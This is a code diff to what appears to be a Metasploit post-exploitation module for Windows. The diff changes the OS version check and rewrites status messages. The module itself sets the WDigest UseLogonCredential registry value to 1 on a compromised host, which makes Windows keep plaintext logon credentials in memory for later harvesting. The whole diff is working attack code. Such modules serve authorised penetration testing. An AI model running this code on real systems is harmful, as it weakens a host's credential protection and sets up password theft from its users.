@@ -30,28 +30,29 @@ class Metasploit3 < Msf::Post
   def run
     print_status("Running module against #{sysinfo['Computer']}")
     # Check if OS is 8/2012 or newer. If not, no need to set the registry key
-    if sysinfo['OS'] =~ /Windows (8|2012)/i
-      wdigest_enable
-    else
+    # Can be backported to Windows 7, 2k8R2 but defaults to enabled...
+    if sysinfo['OS'] =~ /Windows (XP|Vista|200[03])/i
       print_status('Older Windows version detected. No need to enable the WDigest Security Provider. Exiting...')
+    else
+      wdigest_enable
     end
   end
 
   def wdigest_enable
     # Check if the key exists. Not present by default
-    print_status("Checking if the #{WDIGEST_REG_LOCATION}\\UseLogonCredential DWORD exists...")
+    print_status("Checking if the #{WDIGEST_REG_LOCATION}\\#{USE_LOGON_CREDENTIAL} DWORD exists...")
     begin
       wdvalue = registry_getvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL)
       key_exists = !wdvalue.nil?
 
-      print_status("UseLogonCredential is set to #{wdvalue}")
+      print_status("#{USE_LOGON_CREDENTIAL} is set to #{wdvalue}") if key_exists
 
       # If it is not present, create it
       if key_exists && wdvalue == 1
         print_good('Registry value is already set. WDigest Security Provider is enabled')
       else
         verb = key_exists ? 'Setting' : 'Creating'
-        print_status("#{verb} UseLogonCredential DWORD value as 1...")
+        print_status("#{verb} #{USE_LOGON_CREDENTIAL} DWORD value as 1...")
         if registry_setvaldata(WDIGEST_REG_LOCATION, USE_LOGON_CREDENTIAL, 1, 'REG_DWORD')
           print_good('WDigest Security Provider enabled')
         else
